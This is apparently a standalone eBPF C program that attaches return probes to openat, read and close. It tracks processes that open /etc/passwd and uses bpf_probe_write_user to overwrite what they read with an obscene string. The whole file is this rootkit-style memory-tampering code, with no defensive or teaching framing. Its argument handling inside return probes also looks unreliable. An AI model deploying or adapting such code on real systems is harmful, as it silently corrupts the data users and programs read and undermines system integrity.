#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#define MAX_FILENAME_LEN 256

static __always_inline int my_strncmp(const char *s1, const char *s2, int n) {
    for (int i = 0; i < n && s1[i] && s2[i]; i++) {
        if (s1[i] != s2[i])
            return s1[i] - s2[i];
    }
    return 0;
}

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, u32);    // PID as key
    __type(value, int);  // File descriptor as value
    __uint(max_entries, 1024);
} pid_fd_map SEC(".maps");

SEC("kretprobe/__x64_sys_openat")
int ret_sys_openat(struct pt_regs *ctx) {
    int fd = PT_REGS_RC(ctx);
    if (fd < 0)
        return 0;

    u32 pid = bpf_get_current_pid_tgid() >> 32;
    char filename[MAX_FILENAME_LEN];
    bpf_probe_read_user_str(filename, sizeof(filename), (void*)PT_REGS_PARM2(ctx));

    if (my_strncmp(filename, "/etc/passwd", 11) == 0) {
        int *existing_fd = bpf_map_lookup_elem(&pid_fd_map, &pid);
        if (!existing_fd) {
            bpf_map_update_elem(&pid_fd_map, &pid, &fd, BPF_ANY);
            bpf_printk("Started tracking /etc/passwd open by PID %d with FD %d\n", pid, fd);
        } else if (*existing_fd != fd) {
            bpf_map_update_elem(&pid_fd_map, &pid, &fd, BPF_ANY);
            bpf_printk("Updated tracking to new FD %d for PID %d\n", fd, pid);
        }
    }
    return 0;
}

SEC("kretprobe/__x64_sys_read")
int kretprobe_sys_read(struct pt_regs *ctx) {
    int bytes_read = PT_REGS_RC(ctx);
    if (bytes_read <= 0 || PT_REGS_PARM1(ctx) == 0)  // Ignore FD 0
        return 0;

    int fd = PT_REGS_PARM1(ctx);
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    int *tracked_fd = bpf_map_lookup_elem(&pid_fd_map, &pid);
    if (!tracked_fd || *tracked_fd != fd) {
        bpf_printk("PID %d with FD %d not tracked or does not match tracked FD %d\n", pid, fd, (tracked_fd ? *tracked_fd : -1));
        return 0;
    }

    char fake_data[] = "fuck you";
    int data_len = sizeof(fake_data) - 1;
    if (bytes_read >= data_len) {
        bpf_probe_write_user((void *)PT_REGS_PARM2(ctx), fake_data, data_len);
        bpf_printk("Modified read data for PID %d, FD %d\n", pid, fd);
    }
    return 0;
}

SEC("kretprobe/__x64_sys_close")
int ret_sys_close(struct pt_regs *ctx) {
    int fd = PT_REGS_PARM1(ctx);
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    int *tracked_fd = bpf_map_lookup_elem(&pid_fd_map, &pid);
    if (tracked_fd && *tracked_fd == fd) {
        bpf_map_delete_elem(&pid_fd_map, &pid);
        bpf_printk("Stopped tracking FD %d for PID %d on close\n", fd, pid);
    }
    return 0;
}


char LICENSE[] SEC("license") = "Dual BSD/GPL";

